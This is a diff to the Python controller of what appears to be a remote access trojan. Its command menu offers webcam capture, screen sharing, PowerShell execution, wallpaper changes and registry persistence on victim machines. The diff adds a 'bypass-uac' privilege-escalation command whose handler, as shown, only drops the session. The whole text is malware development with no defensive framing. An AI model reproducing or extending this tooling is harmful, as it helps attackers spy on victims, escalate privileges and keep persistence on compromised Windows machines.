@@ -18,6 +18,7 @@ if keys == "{}" or "":
         keyser.write(key)
 
 
+
 def replace_string(filename, old_string, new_string):
     with open(filename) as f:
         s = f.read()
@@ -260,6 +261,7 @@ def target_communication(target, ip):
                     webcam_list                        --> get Available Webcam Sources
                     changepolicy                       --> execute powershell scripts
                     cwallpaper                         --> change wallpaper
+                    bypass-uac                         --> try to bypass uac
                     persistence *RegName* *fileName*    --> Create Persistence In Registry'''))
             elif command[:11] == 'screenshare':
                 upload_file(target, 'scripts\\screenshare.ps1')
@@ -272,6 +274,12 @@ def target_communication(target, ip):
                 else:
                     print("[+] Image Captured")
                     os.system('start webcam.jpg')
+            elif command[:10] == "bypass-uac":
+                print("[*] you will lose session after trying exploit")
+                targets.remove(target)
+                ips.remove(ip)
+                users.remove(users[num])
+
 
             elif command[:10] == 'cwallpaper':
                 if isfile(command[11:]) == True:
